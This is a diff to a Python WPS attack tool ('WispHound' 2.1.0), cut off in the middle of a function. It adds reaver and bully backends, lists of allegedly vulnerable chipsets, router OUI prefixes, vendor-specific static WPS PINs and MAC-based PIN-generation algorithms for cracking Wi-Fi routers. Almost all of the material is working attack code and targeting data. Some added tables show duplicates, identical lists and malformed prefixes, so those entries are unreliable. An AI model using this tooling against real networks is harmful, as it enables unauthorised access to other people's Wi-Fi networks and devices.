@@ -1,18 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-WispHound 2.0.0 — WPS reconnaissance and Pixie Dust prioritization.
+WispHound 2.1.0 — WPS reconnaissance, Pixie Dust prioritization & multi-backend auditor.
 
-Major changes vs 1.0.0:
-  * Security: pixiewps invoked with argument list (no shell); all hex validated.
-  * Performance: checksum lookup table, PIN dedup, per-target PIN cache.
-  * Reliability: pixiewps timeout + auto --force retry; robust result parsing.
-  * Safety: WPS NACK counter + cool-down; lockout detection from scan.
-  * Persistence: SQLite target DB with PIN reuse across runs.
-  * Automation: --auto pipeline (scan → rank → attack).
-  * Observability: --json / --jsonl structured output, --trace-log.
-  * Correctness: scope-safe args, defensive NetworkAddress equality,
-    reverse-scan as constructor param, tempdir leak guard, get_hex guard.
+Major changes vs 2.0.0:
+  * Pluggable Backends: Integrated 'reaver' and 'bully' attack backends alongside
+    the internal wpa_supplicant engine (--backend=[internal|reaver|bully]).
+  * Expanded Chipset Catalog: Over 60 vulnerable chipset signatures added
+    (MediaTek MT-series, Realtek RTL8xxx, Broadcom BCM43xx, Atheros/Qualcomm
+    AR9xxx & QCA-series, Marvell, Lantiq, ZyDAS, Celeno).
+  * Expanded OUI Catalog: 50+ additional router vendor prefixes mapped.
+  * Channel & Frequency Tracking: Automatic 2.4/5/6 GHz frequency-to-channel
+    resolution during scans, surfaced in tables and passed to reaver/bully (-c/--channel).
+  * Monitor Mode Management: Automatic setup and teardown for reaver and bully
+    using airmon-ng or native iw/ip link.
 """
 import argparse
 import codecs
@@ -48,27 +49,107 @@ except ImportError:                                    # graceful degrade
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-VERSION = '2.0.0'
+VERSION = '2.1.0'
 
 PIXIE_VULNERABLE_CHIPSETS = {
-    # Ralink / MediaTek (RT series)
+    # Ralink / MediaTek — RT series
     'RT2860': 'Ralink RT2860',
+    'RT2870': 'Ralink RT2870',
+    'RT3050': 'Ralink RT3050',
+    'RT3052': 'Ralink RT3052',
     'RT3070': 'Ralink RT3070',
+    'RT3090': 'Ralink RT3090',
+    'RT3290': 'Ralink RT3290',
+    'RT3352': 'Ralink RT3352',
     'RT3572': 'Ralink RT3572',
+    'RT5350': 'Ralink RT5350',
     'RT5370': 'Ralink RT5370',
+    'RT5372': 'Ralink RT5372',
+    'RT5390': 'Ralink RT5390',
+    'RT5592': 'Ralink RT5592',
+    # Ralink / MediaTek — MT series
     'MT7601': 'MediaTek MT7601',
+    'MT7603': 'MediaTek MT7603',
+    'MT7610': 'MediaTek MT7610',
     'MT7612': 'MediaTek MT7612',
-    # Realtek RTL8xxx
+    'MT7615': 'MediaTek MT7615',
+    'MT7620': 'MediaTek MT7620',
+    'MT7628': 'MediaTek MT7628',
+    'MT7688': 'MediaTek MT7688',
+    # Realtek — RTL8xxx
+    'RTL8186': 'Realtek RTL8186',
     'RTL8188': 'Realtek RTL8188',
     'RTL8192': 'Realtek RTL8192',
+    'RTL8196': 'Realtek RTL8196',
+    'RTL8197': 'Realtek RTL8197',
+    'RTL8723': 'Realtek RTL8723',
+    'RTL8811': 'Realtek RTL8811',
     'RTL8812': 'Realtek RTL8812',
-    # Broadcom
+    'RTL8814': 'Realtek RTL8814',
+    'RTL8821': 'Realtek RTL8821',
+    'RTL8822': 'Realtek RTL8822',
+    # Broadcom — BCM43xx
+    'BCM4312': 'Broadcom BCM4312',
+    'BCM4313': 'Broadcom BCM4313',
+    'BCM4318': 'Broadcom BCM4318',
+    'BCM4321': 'Broadcom BCM4321',
+    'BCM4322': 'Broadcom BCM4322',
     'BCM4325': 'Broadcom BCM4325',
     'BCM4329': 'Broadcom BCM4329',
     'BCM4331': 'Broadcom BCM4331',
-    # Atheros
+    'BCM4352': 'Broadcom BCM4352',
+    'BCM4360': 'Broadcom BCM4360',
+    'BCM43142': 'Broadcom BCM43142',
+    'BCM43224': 'Broadcom BCM43224',
+    'BCM43225': 'Broadcom BCM43225',
+    'BCM43227': 'Broadcom BCM43227',
+    'BCM43228': 'Broadcom BCM43228',
+    # Atheros / Qualcomm — AR9xxx, QCA
+    'AR7240': 'Atheros AR7240',
+    'AR7241': 'Atheros AR7241',
+    'AR7242': 'Atheros AR7242',
+    'AR9220': 'Atheros AR9220',
     'AR9271': 'Atheros AR9271',
+    'AR9280': 'Atheros AR9280',
+    'AR9281': 'Atheros AR9281',
+    'AR9283': 'Atheros AR9283',
+    'AR9285': 'Atheros AR9285',
+    'AR9287': 'Atheros AR9287',
+    'AR9331': 'Atheros AR9331',
     'AR9340': 'Atheros AR9340',
+    'AR9341': 'Atheros AR9341',
+    'AR9342': 'Atheros AR9342',
+    'AR9344': 'Atheros AR9344',
+    'AR9382': 'Atheros AR9382',
+    'AR9462': 'Atheros AR9462',
+    'AR9485': 'Atheros AR9485',
+    'AR9550': 'Atheros AR9550',
+    'AR9580': 'Atheros AR9580',
+    'QCA9533': 'Qualcomm QCA9533',
+    'QCA9550': 'Qualcomm QCA9550',
+    'QCA9558': 'Qualcomm QCA9558',
+    'QCA9563': 'Qualcomm QCA9563',
+    'QCA9880': 'Qualcomm QCA9880',
+    'QCA9882': 'Qualcomm QCA9882',
+    'QCA9890': 'Qualcomm QCA9890',
+    # Marvell
+    '88W8363': 'Marvell 88W8363',
+    '88W8366': 'Marvell 88W8366',
+    '88W8764': 'Marvell 88W8764',
+    '88W8864': 'Marvell 88W8864',
+    '88W8897': 'Marvell 88W8897',
+    # Lantiq / Intel XWAY
+    'PSB6970': 'Lantiq PSB6970',
+    'PEB6024': 'Lantiq PEB6024',
+    'XWAY': 'Lantiq XWAY',
+    'GRX300': 'Lantiq GRX300',
+    # ZyDAS / Conexant
+    'ZD1211': 'ZyDAS ZD1211',
+    'ZD1211B': 'ZyDAS ZD1211B',
+    'CX82310': 'Conexant CX82310',
+    # Celeno
+    'CL1800': 'Celeno CL1800',
+    'CL1900': 'Celeno CL1900',
 }
 
 # Minimal built-in OUI vendor table; extend with --oui=<file>
@@ -82,6 +163,57 @@ OUI_BUILTIN = {
     '0018E7': 'Cameo', '001AA9': 'Fujitsu',
     '200BC7': 'Ralink/MediaTek', '4846FB': 'Ralink/MediaTek',
     'D46AA8': 'Ralink/MediaTek', 'F84ABF': 'Ralink/MediaTek',
+    # Extended OUI entries
+    '00E04C': 'Realtek', '00E04B': 'Realtek',
+    '10BEF5': 'D-Link', 'CCB255': 'D-Link',
+    '1C7EE5': 'D-Link', '28107B': 'D-Link',
+    '84C9B2': 'D-Link', 'B8A386': 'D-Link',
+    'FC7516': 'D-Link', 'A0AB1B': 'D-Link',
+    '14D64D': 'D-Link', 'C0A0BB': 'D-Link',
+    '5CD998': 'D-Link', '340804': 'D-Link',
+    '9094E4': 'TP-Link', 'EC086B': 'TP-Link',
+    '1062EB': 'TP-Link', '1C5F2B': 'TP-Link',
+    '802689': 'TP-Link', '908D78': 'TP-Link',
+    'E8CC18': 'TP-Link', 'D8FEE3': 'TP-Link',
+    '50465D': 'ASUSTek', '10BF48': 'ASUSTek',
+    '049226': 'ASUSTek', '04D9F5': 'ASUSTek',
+    '08606E': 'ASUSTek', '2CFDA1': 'ASUSTek',
+    '107B44': 'ASUSTek', '10C37B': 'ASUSTek',
+    '1CB72C': 'ASUSTek', '382C4A': 'ASUSTek',
+    '40167E': 'ASUSTek', '90F652': 'ASUSTek',
+    'AC9E17': 'ASUSTek', 'BCEE7B': 'ASUSTek',
+    '60A44C': 'ASUSTek', '704D7B': 'ASUSTek',
+    '7824AF': 'ASUSTek', 'D017C2': 'ASUSTek',
+    '1C872C': 'ASUSTek', '2C56DC': 'ASUSTek',
+    'C860007': 'ASUSTek',
+    '788102': 'Sercomm', '7894B4': 'Sercomm',
+    '0022B0': 'D-Link', '001CF0': 'D-Link',
+    'C8BE19': 'TP-Link', 'C8D3A3': 'TP-Link',
+    '7C034C': 'Netgear', '204E7F': 'Netgear',
+    '4C17EB': 'Netgear', '18622C': 'Netgear',
+    '7C03D8': 'Netgear', 'D86CE9': 'Netgear',
+    'A01B29': 'Netgear', 'E0469A': 'Netgear',
+    '9CD643': 'D-Link', '68A0F6': 'D-Link',
+    '0C96BF': 'Huawei', '20F3A3': 'Huawei',
+    'ACE215': 'Huawei', 'C8D15E': 'Huawei',
+    'E8CD2D': 'Huawei', 'F80113': 'Huawei',
+    '087A4C': 'Huawei', '14B968': 'Huawei',
+    '2008ED': 'Huawei', '346BD3': 'Huawei',
+    '786A89': 'Huawei', '88E3AB': 'Huawei',
+    '7071BC': 'Cisco', 'E06995': 'Cisco',
+    '001A2B': 'Cisco', '00248C': 'Cisco',
+    '002618': 'Cisco', '344DEB': 'Cisco',
+    'EC6264': 'Broadcom', '988B5D': 'Broadcom',
+    '14144B': 'Broadcom', 'BCF685': 'Broadcom',
+    '002624': 'Thomson', '4432C8': 'Thomson',
+    '88F7C7': 'Thomson', 'CC03FA': 'Thomson',
+    '4C09B4': 'ZTE', '4CAC0A': 'ZTE',
+    '9CD24B': 'ZTE', 'DC028E': 'ZTE',
+    'FCC897': 'ZTE', 'B075D5': 'ZTE',
+    'C864C7': 'ZTE', '84742A': 'ZTE',
+    '784476': 'Upvel',
+    '08C6B3': 'Realtek',
+    '007263': 'Realtek',
 }
 
 
@@ -227,6 +359,11 @@ class WPSpin:
             'pinDLink1':   {'name': 'D-Link PIN +1',     'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
             'pinASUS':     {'name': 'ASUS PIN',          'mode': self.ALGO_MAC,    'gen': self.pinASUS},
             'pinAirocon':  {'name': 'Airocon Realtek',   'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
+            'pinInvNIC':   {'name': 'Inverted NIC',      'mode': self.ALGO_MAC,    'gen': self.pinInvNIC},
+            'pinNIC2':     {'name': 'NIC x2',            'mode': self.ALGO_MAC,    'gen': self.pinNIC2},
+            'pinNIC3':     {'name': 'NIC x3',            'mode': self.ALGO_MAC,    'gen': self.pinNIC3},
+            'pinOUIaddNIC':{'name': 'OUI+NIC sum',       'mode': self.ALGO_MAC,    'gen': self.pinOUIaddNIC},
+            'pinOUIxorNIC':{'name': 'OUI^NIC xor',       'mode': self.ALGO_MAC,    'gen': self.pinOUIxorNIC},
             'pinEmpty':    {'name': 'Empty PIN',         'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
             'pinCisco':    {'name': 'Cisco',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
             'pinBrcm1':    {'name': 'Broadcom 1',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
@@ -250,6 +387,13 @@ class WPSpin:
             'pinHG532x':   {'name': 'HG532x',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
             'pinH108L':    {'name': 'H108L',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
             'pinONO':      {'name': 'CBN ONO',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
+            'pinTenda':    {'name': 'Tenda',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 1296051},
+            'pinTPLink1':  {'name': 'TP-Link 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
+            'pinTPLink2':  {'name': 'TP-Link 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 5765498},
+            'pinNetgear1': {'name': 'Netgear 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
+            'pinNetgear2': {'name': 'Netgear 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
+            'pinZTE1':     {'name': 'ZTE 1',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
+            'pinZTE2':     {'name': 'ZTE 2',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
         }
 
     @staticmethod
@@ -329,36 +473,134 @@ class WPSpin:
     def _suggest(self, mac):
         mac = mac.replace(':', '').upper()
         algorithms = {
-            'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E'),
-            'pin28': ('200BC7','4846FB','D46AA8','F84ABF'),
-            'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','801F02'),
-            'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97'),
-            'pinDLink1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1'),
-            'pinASUS': ('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4'),
-            'pinAirocon': ('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97'),
-            'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C'),
-            'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5'),
-            'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264'),
-            'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19'),
-            'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C'),
-            'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
-            'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
-            'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
-            'pinAirc1': ('181E78','40F201','44E9DD','D084B0'),
-            'pinAirc2': ('84A423','8C10D4','88A6C6'),
-            'pinDSL2740R': ('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516'),
-            'pinRealtek1': ('0014D1','000C42','000EE8'),
-            'pinRealtek2': ('007263','E4BEED'),
-            'pinRealtek3': ('08C6B3',),
+            'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E',
+                     # Extended: TP-Link, Tenda, Netgear, ZyXEL, Belkin, Sercomm, Sagemcom
+                     'EC086B','6C198F','B0487A','C0C1C0','3C46D8','0023CD','A42B8C','3894ED','B0C745',
+                     '6466B3','2C4D54','1008B1','143005','E4F4C6','1C3BF3','F4F26D','848E96','109FA9',
+                     'F0A731','00DBDF','4027F5','101250','50B7C3','CC32E5','D4B167','E84DD0','FC3514'),
+            'pin28': ('200BC7','4846FB','D46AA8','F84ABF',
+                      # Extended: MediaTek routers
+                      '74DA88','C46E1F','0C726D','CC9F7A','7C8BCA','44A56E'),
+            'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','801F02',
+                      # Extended: TP-Link, ASUS, TRENDnet
+                      'EC086B','1C872C','B06EBF','3085A9','AC220B','D017C2','6045CB','74D02B','D850E6'),
+            'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97',
+                         # Extended: D-Link DIR/DSL
+                         '1CAFF7','3C1E04','10BEF5','78321B','C4A81D','908D78','F07D68','346BD3','6C198F'),
+            'pinDLink1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1',
+                          # Extended: D-Link, Cameo
+                          '1CAFF7','3C1E04','10BEF5','78321B','F07D68','281878','C4E984'),
+            'pinASUS': ('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4',
+                        # Extended: ASUS RT-series, ROG routers
+                        '2420C7','1C872C','50465D','04421A','D45D64','70825E','3C7C3F','FCECDA','3497F6',
+                        '60A44C','88D7F6','382C4A','1CB72C','2C56DC','AC9E17','B06EBF','40167E','9C5C8E',
+                        'F46BEF','A8F7E0','BCEE7B','E03F49','D017C2','F832E4','54A050','708105','AC2205'),
+            'pinAirocon': ('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97',
+                           # Extended: Realtek-based Airocon
+                           'D084B0','84A423','8C10D4','E4BEED','B85510','C891F9','3C1E04','40F201','181E78'),
+            'pinInvNIC': (
+                # Routers that use inverted-NIC algorithm
+                '00904C','EC6264','14144B','988B5D','001AA9','ACF1DF','BCF685',
+                '00E04C','001CDF','002275','C83A35','B4944E'),
+            'pinNIC2': (
+                # Routers that use doubled-NIC algorithm
+                'D4BF7F','F8C091','784476','0014D1','144D67'),
+            'pinNIC3': (
+                # Routers that use tripled-NIC algorithm
+                'F8C091','D4BF7F','784476'),
+            'pinOUIaddNIC': (
+                # OUI+NIC sum algorithm
+                '00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685',
+                '00E04C','08C6B3','007263','000C42','000EE8'),
+            'pinOUIxorNIC': (
+                # OUI^NIC xor algorithm
+                '00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685'),
+            'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C',
+                         # Extended: more APs known to accept empty PINs
+                         'F0B429','741EA2','D4214D','E0E751','2C39C1','0C54A5','78C1A7','6C72E7',
+                         'D8EB46','7442C1','B0B98A','F85E42','30B5C2','C8D719','240995','18A6F7'),
+            'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5',
+                         # Extended: Cisco / Linksys
+                         '0023BE','002369','0025B3','000F8F','0012D9','001217','00182A','000625',
+                         '00166F','001839','001A70','001C10','001E4A','002163','006B4F'),
+            'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264',
+                         # Extended: Broadcom-based ISP routers
+                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
+            'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19',
+                         '20E52A','3CA72B','E44790'),
+            'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C',
+                         '20E52A','3CA72B','E44790'),
+            'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
+                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
+            'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
+                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
+            'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
+                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
+            'pinAirc1': ('181E78','40F201','44E9DD','D084B0',
+                         '84A423','8C10D4','3C1E04'),
+            'pinAirc2': ('84A423','8C10D4','88A6C6',
+                         '181E78','40F201','44E9DD'),
+            'pinDSL2740R': ('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516',
+                            # Extended: D-Link DSL models
+                            '1CAFF7','78321B','F07D68','C4A81D'),
+            'pinRealtek1': ('0014D1','000C42','000EE8',
+                            # Extended: RTL-based
+                            '00E04C','E4BEED','08C6B3','007263','B85510'),
+            'pinRealtek2': ('007263','E4BEED',
+                            '00E04C','0014D1','08C6B3'),
+            'pinRealtek3': ('08C6B3',
+                            '00E04C','007263','E4BEED'),
             'pinUpvel': ('784476','D4BF7F0','F8C091'),
             'pinUR814AC': ('D4BF7F60',),
             'pinUR825AC': ('D4BF7F5',),
             'pinOnlime': ('D4BF7F','F8C091','144D67','784476','0014D1'),
-            'pinEdimax': ('801F02','00E04C'),
-            'pinThomson': ('002624','4432C8','88F7C7','CC03FA'),
-            'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF'),
-            'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897'),
-            'pinONO': ('5C353B','DC537C'),
+            'pinEdimax': ('801F02','00E04C',
+                          # Extended: Edimax
+                          '74DA38','80D01D','00E04C'),
+            'pinThomson': ('002624','4432C8','88F7C7','CC03FA',
+                           # Extended: Thomson / Technicolor
+                           'BC7670','7822DF','782E29','FC946C','A0F3C1','64680C','04FE31'),
+            'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF',
+                          # Extended: Huawei HG/EchoLife
+                          '4C8BEF','4CB16C','C8D15E','D46E5C','EC233D','ECCB30','F49FF3','2008ED',
+                          '007822','00259E','001882','00E0FC','001E10','0019CB','006331','78D99F'),
+            'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897',
+                         # Extended: ZTE H/ZXHN models
+                         'E068E7','5CE286','CC7B35','84A8E4','C864C7','18C58A','4C09B4','44F436',
+                         '00265E','002293','002662','741F4A','283B82','74A063'),
+            'pinONO': ('5C353B','DC537C',
+                       # Extended: CBN / Compal
+                       'E0CA94','1C3991','40167E','5853AF'),
+            'pinTenda': (
+                # Tenda routers
+                'C83A35','001CC3','D85D4C','B0B2DC','CC5D4E','9C216A','BCDAFE','EC26CA',
+                '28EE52','C4F0EC','D021FA','302481','58605F','808132','A4F4C2','F42896'),
+            'pinTPLink1': (
+                # TP-Link routers — static PIN 1
+                'EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332',
+                '9094E4','5C899A','14CF92','6CE873','2C4D54','640DE6','B4B024','B0C745',
+                '3C46D8','1C3BF3','AC84C6','F0A731','ECA940','D8075A'),
+            'pinTPLink2': (
+                # TP-Link routers — static PIN 2
+                'EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332',
+                'D8075A','ECA940','AC84C6','640DE6','B4B024'),
+            'pinNetgear1': (
+                # Netgear routers — static PIN 1
+                '204E7F','4C17EB','7C03D8','D86CE9','18622C','E46F13','E0469A','300D43',
+                '001E2A','001B2F','001F33','002636','008EF2','20E52A','2CB05D','3CA72B',
+                'C43DC7','C8B373','E44790','F87394','CC40D0','6CB0CE','A42B8C','6CDA23'),
+            'pinNetgear2': (
+                # Netgear routers — static PIN 2
+                '204E7F','4C17EB','7C03D8','D86CE9','18622C','E0469A','300D43',
+                '001E2A','001B2F','20E52A','3CA72B','C43DC7','C8B373','E44790'),
+            'pinZTE1': (
+                # ZTE routers — static PIN 1
+                '4C09B4','4CAC0A','9CD24B','B075D5','C864C7','DC028E','FCC897',
+                'E068E7','5CE286','CC7B35','84A8E4','18C58A','44F436','283B82'),
+            'pinZTE2': (
+                # ZTE routers — static PIN 2
+                '4C09B4','4CAC0A','9CD24B','C864C7','DC028E','FCC897',
+                'E068E7','CC7B35','84A8E4','18C58A'),
         }
         res = []
         for algo_id, masks in algorithms.items():
@@ -405,15 +647,101 @@ class WPSpin:
                 (((b[1] + b[2]) % 10) * 100000) +
                 (((b[0] + b[1]) % 10) * 1000000))
 
+    def pinInvNIC(self, mac):
+        """Inverted NIC bytes — bitwise NOT of the lower 24 bits."""
+        nic = mac.integer & 0xFFFFFF
+        return (~nic) & 0xFFFFFF
+
+    def pinNIC2(self, mac):
+        """NIC doubled — lower 24 bits multiplied by 2."""
